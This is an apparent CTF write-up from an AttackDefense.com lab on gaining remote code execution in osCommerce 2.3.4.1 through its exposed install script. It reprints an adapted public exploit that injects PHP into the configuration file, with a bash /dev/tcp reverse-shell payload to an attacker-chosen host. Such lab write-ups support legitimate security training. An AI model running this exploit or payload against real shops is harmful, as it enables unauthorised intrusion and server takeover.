---
layout: post
title: AttackDefense.com [RCE] - osCommerce
date: 2018-10-26 13:57 -0300
categories: [AttackDefense.com, ctf, writeups, RCE]
tags: [ writeups, CTF,  challange, AttackDefense.com]
---

![Image of AttackDefense 2018](/uploads/Screenshot from 2018-10-26 17-44-27.png)

### Mission

A version of osCommerce is vulnerable to a remote code execution attack. Exploiting this flaw does not require any valid accounts on the system. A attacker can remotely exploit the system and run arbitrary commands on the system as the web server user.

Your task is to find this vulnerability and gain remote code exploitation!   

Level difficulty: Intermediate

Category: Real World Webapps > Remote Code Execution

### Solution

Also, on this challenge, I got a real copy of a```osCommerce``` application deploy, an online shop. 

![Image of AttackDefense 2018](/uploads/adrce3/image1.png)

From the previous challenge (AttackDefense.com [RCE] - ApPHP MicroBlog) I got the simplest idea of testing for installation files and folders in order to gain more information about the target.

By accessing [http://cmngb11ivpcr7if1cc227nrzp.public1.attackdefenselabs.com/install/](http://cmngb11ivpcr7if1cc227nrzp.public1.attackdefenselabs.com/install/) I obtain the following:

![Image of AttackDefense 2018](/uploads/adrce3/image8.png)

Knowing the version of the application I decided to search for a publicly available exploit. I found an interesting one at this [link](https://www.exploit-db.com/exploits/44374/).

![Image of AttackDefense 2018](/uploads/adrce3/image10.png)

After taking a look at the exploit code I decided to adapt it to my needs:

![Image of AttackDefense 2018](/uploads/adrce3/image2.png)


```terminal
lucian@local:~/Downloads$ python 44374.py 
[+] Successfully launched the exploit. Open the following URL to execute your code

http://cmngb11ivpcr7if1cc227nrzp.public1.attackdefenselabs.com/install/includes/configure.php
lucian@local:~/Downloads$ 
```

![Image of AttackDefense 2018](/uploads/adrce3/image5.png)

At this point, we got a remote code execution using a PHP Object Injection vector of attack.

In order to obtain a reverse shell for this exploit you have to make a few changes to the exploit script. 

![Image of AttackDefense 2018](/uploads/adrce3/image4.png)

The exploit code will like that:

```python

# Exploit Title: osCommerce 2.3.4.1 Remote Code Execution
# Date: 29.0.3.2018
# Exploit Author: Simon Scannell - https://scannell-infosec.net <contact@scannell-infosec.net>
# Version: 2.3.4.1, 2.3.4 - Other versions have not been tested but are likely to be vulnerable
# Tested on: Linux, Windows

# If an Admin has not removed the /install/ directory as advised from an osCommerce installation, it is possible
# for an unauthenticated attacker to reinstall the page. The installation of osCommerce does not check if the page
# is already installed and does not attempt to do any authentication. It is possible for an attacker to directly
# execute the "install_4.php" script, which will create the config file for the installation. It is possible to inject
# PHP code into the config file and then simply executing the code by opening it.


import requests

# enter the the target url here, as well as the url to the install.php (Do NOT remove the ?step=4)
base_url = "http://cmngb11ivpcr7if1cc227nrzp.public1.attackdefenselabs.com/"
target_url = "http://cmngb11ivpcr7if1cc227nrzp.public1.attackdefenselabs.com/install/install.php?step=4"

data = {
    'DIR_FS_DOCUMENT_ROOT': './'
}

# the payload will be injected into the configuration file via this code
# '  define(\'DB_DATABASE\', \'' . trim($HTTP_POST_VARS['DB_DATABASE']) . '\');' . "\n" .
# so the format for the exploit will be: '); PAYLOAD; /*

payload = '\');'
# payload += 'system("ls");'    # this is where you enter you PHP payload
payload += 'system("bash -i >& /dev/tcp/<Your VPS IP Address>/1337 0>&1");'    # this is where you enter you PHP payload
payload += '/*'

data['DB_DATABASE'] = payload

# exploit it
r = requests.post(url=target_url, data=data)

if r.status_code == 200:
    print("[+] Successfully launched the exploit. Open the following URL to execute your code\n\n" + base_url + "install/includes/configure.php")
else:
    print("[-] Exploit did not execute as planned")

```

![Image of AttackDefense 2018](/uploads/adrce3/image6.png)